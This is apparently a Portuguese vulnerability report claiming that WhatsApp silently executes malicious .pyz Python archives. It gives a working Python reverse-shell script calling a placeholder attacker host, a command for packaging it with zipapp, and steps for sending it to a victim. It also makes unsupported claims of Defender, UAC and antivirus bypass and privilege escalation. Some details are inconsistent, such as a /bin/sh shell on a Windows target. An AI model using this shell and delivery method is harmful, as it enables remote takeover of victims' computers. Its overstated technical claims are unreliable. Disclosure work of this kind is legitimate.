# Vulnerabilidade no WhatsApp: Execução de Malware via Arquivo Python (.pyz)

### Descrição 

Esta vulnerabilidade crítica no WhatsApp permite a execução automática de arquivos maliciosos com extensão `.pyz` (Python). O atacante pode enviar um arquivo `.pyz` malicioso via WhatsApp, e quando a vítima clica para abri-lo, o arquivo é executado sem qualquer notificação ou confirmação. Isso resulta na possibilidade de execução de um reverse shell ou mesmo de elevação de privilégios. Mesmo em um perfil de usuário convidado, o malware pode escalar para privilégios administrativos, explorando falhas no UAC do Windows.


## Steps to Reproduce

### Procedimento

1. **Criação do Arquivo Malicioso**:
   - Crie um script Python que abre um reverse shell.
   - Exemplo de script Python para reverse shell:
     ```python
     import socket, subprocess, os
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("attacker_ip", attacker_port))
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     p = subprocess.call(["/bin/sh", "-i"])
     ```

2. **Compactação em `.pyz`**:
   - Utilize o `zipapp` para criar o arquivo `.pyz`:
     ```bash
     python -m zipapp reverse_shell.py -o reverse_shell.pyz
     ```

3. **Envio pelo WhatsApp**:
   - Envie o arquivo `.pyz` para a vítima através do WhatsApp.

4. **Execução pela Vítima**:
   - A vítima abre o arquivo `.pyz` sem receber qualquer aviso ou confirmação.
   - O malware é executado automaticamente, estabelecendo o reverse shell.

## Explicação Técnica

### Comportamento do Arquivo `.pyz`

- **Arquivos `.pyz`**: São arquivos zipados que contêm scripts Python. Eles são executáveis diretamente pelo interpretador Python sem a necessidade de descompactação manual.
- **Facilidade de Execução**: Arquivos `.pyz` são simples de criar e executar, tornando-os uma escolha conveniente para a entrega de payloads maliciosos.
- **Bypass de Verificações**: A capacidade de contornar verificações de segurança tradicionais faz com que esses arquivos sejam particularmente perigosos.
- **Execução Automática**: Esses arquivos contornam muitas verificações de segurança típicas, como as realizadas pelo Windows Defender e UAC, permitindo a execução do código malicioso sem impedimentos.

## Impacto

A vulnerabilidade permite que atacantes obtenham controle total da máquina da vítima sem interferência de sistemas de segurança. Além disso, possibilita a elevação de privilégios, ampliando significativamente o potencial de dano.

## Detalhamento Técnico

### Falhas de Comportamento

1. **Windows Defender**:
   - **Verificação de Integridade por Assinatura**: O Windows Defender depende de assinaturas de arquivo para identificar malwares conhecidos. No entanto, quando o arquivo `.pyz` é enviado e aberto através do WhatsApp, o Defender não realiza uma verificação adequada da assinatura. Isso ocorre porque o WhatsApp não fornece metadados suficientes para que o Defender possa identificar o arquivo como uma ameaça.
   - **Bloqueio de Execução**: A proteção em tempo real do Windows Defender é bypassada pelo WhatsApp ao abrir arquivos `.pyz`, permitindo a execução sem bloqueio.

2. **UAC (Controle de Conta de Usuário)**:
   - **Solicitação de Permissão**: O UAC não solicita permissão administrativa ao executar arquivos `.pyz` vindos do WhatsApp. Isso se deve a uma falha na integração de contexto de segurança entre o WhatsApp e o sistema operacional, onde o arquivo é tratado como um conteúdo confiável, permitindo a elevação de privilégios.

3. **WhatsApp**:
   - **Verificação de Segurança**: O WhatsApp não realiza verificações de segurança adequadas ao abrir arquivos `.pyz`. Isso significa que não há análise de comportamento do arquivo antes da execução, nem verificação de integridade ou origem.
   - **Notificação ao Usuário**: O WhatsApp não implementa uma notificação de segurança ou confirmação antes da execução de arquivos potencialmente perigosos. Isso deixa os usuários vulneráveis a execuções automáticas de malware.

4. **Softwares Antivírus**:
   - **Detecção de Malware**: Muitos antivírus dependem de varreduras em tempo real e assinaturas de arquivo. No entanto, a execução de arquivos `.pyz` através do WhatsApp não é devidamente interceptada, permitindo que o malware passe despercebido.
   - **Bloqueio de Payloads**: A execução de payloads maliciosos que estabelecem conexões remotas (como reverse shells) não é bloqueada quando o arquivo `.pyz` é executado via WhatsApp. Isso se deve a uma falha na inspeção profunda de pacotes e comportamentos de rede por parte dos antivírus, especialmente quando o arquivo é iniciado por um aplicativo confiável como o WhatsApp.

---


https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63

